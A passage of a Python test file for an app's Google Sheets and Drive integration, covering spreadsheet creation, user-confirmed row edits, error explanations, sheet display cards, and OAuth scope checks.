        raise GoogleApiError(403, "Google Sheets API has not been used in project 1")

    monkeypatch.setattr(gdrive, "create_spreadsheet", create_spreadsheet)
    monkeypatch.setattr(api, "get_json", not_enabled)

    done = await perform(
        None, "sheets.create", {"title": "Trip", "columns": ["A"], "rows": []}
    )

    assert done["spreadsheet_id"] == BOOK


async def test_drive_is_asked_to_make_a_sheet_of_the_csv(monkeypatch):
    sent: list[tuple] = []

    async def upload(session, described, content, sent_as):
        sent.append((described, content, sent_as))
        return {"id": BOOK, "name": "Trip", "link": LINK}

    monkeypatch.setattr(gdrive, "_upload", upload)

    await gdrive.create_spreadsheet(None, "Trip", "Place\nGoa\n")

    assert sent == [
        (
            {"name": "Trip", "mimeType": "application/vnd.google-apps.spreadsheet"},
            "Place\nGoa\n",
            "text/csv",
        )
    ]


async def test_a_change_that_is_carried_out_puts_the_sheet_on_screen_marked(
    sheets, shown, writable
):
    moment = [1000.0]
    context = _context(clock=lambda: moment[0])
    drafted = await actions.sheets_draft_rows(context, BOOK, ["Item"], [["Tea"]])
    gate = context.userdata.gate
    # The draft was read out, and the user then said yes.
    moment[0] += 1
    gate.mark_reviewed(drafted["action_id"])
    moment[0] += 1
    gate.note_user_input()

    done = await actions.confirm_action(context, drafted["action_id"])

    assert done["status"] == "done"
    assert done["spreadsheet_id"] == BOOK
    card = shown[-1]
    assert (card["kind"], card["tab"], card["changed_rows"]) == (
        "sheet",
        "October",
        [6],
    )


def test_a_sheet_that_changed_since_the_draft_is_explained():
    reason = actions._why_not("sheets.set_cells", gsheets.ChangedError())

    assert "changed since the draft" in reason


def test_a_sheet_the_user_may_only_view_is_explained():
    reason = actions._why_not(
        "sheets.add_rows", GoogleApiError(403, "The caller does not have permission")
    )

    assert "only be allowed to view" in reason


# --- What the app is given ----------------------------------------------------


async def test_the_card_gets_the_tab_as_the_user_sees_it(sheets, monkeypatch):
    monkeypatch.setattr(sheets_api, "MAX_SHOWN_ROWS", 2)

    view = await sheets_api.sheet(BOOK, tab="October")

    assert (view.title, view.tab, view.link) == ("Expenses 2026", "October", LINK)
    assert view.headers == ["Date", "Item", "Category", "Amount"]
    assert [row.row for row in view.rows] == [2, 3]
    assert view.more == 1


async def test_a_sheet_card_names_the_sheet_and_what_to_mark(monkeypatch):
    sent: list[dict] = []

    async def show(card, *, push=None):
        sent.append(card)

    monkeypatch.setattr(stage, "show", show)

    await stage.show_sheet(BOOK, "Expenses 2026", "October", changed_cells=["D3"])

    (card,) = sent
    assert card["changed_cells"] == ["D3"]
    assert card["changed_rows"] == []
    assert card["shown_at"] > 0


# --- Connecting --------------------------------------------------------------


@pytest.mark.parametrize(
    ("granted", "level"),
    [
        ([], "none"),
        # Sheets are read through the grant Drive is read with.
        ([AUTH + "drive.readonly"], "read"),
        ([AUTH + "drive.readonly", AUTH + "drive.file"], "read"),
        ([AUTH + "drive.readonly", AUTH + "spreadsheets"], "write"),
    ],
)
def test_access_to_sheets_follows_the_scopes_granted(granted, level):
    assert access_level("gsheets", granted) == level


@pytest.mark.parametrize(
    ("answer", "working"), [(404, True), (200, True), (403, False)]
)
def test_sheets_is_working_when_it_answers_about_a_sheet_that_is_not_there(
    monkeypatch, answer, working
):
    class Session:
        def __init__(self, credentials):
            pass

        def get(self, url, timeout):
            assert url.startswith("https://sheets.googleapis.com/v4/spreadsheets/")
            return SimpleNamespace(
                ok=answer < 400,
                status_code=answer,
                json=lambda: {
                    "error": {"message": "Google Sheets API has not been used"}
                },
                text="",
            )

    monkeypatch.setattr(status, "AuthorizedSession", Session)

    assert status._probe("gsheets", None)[0] is working
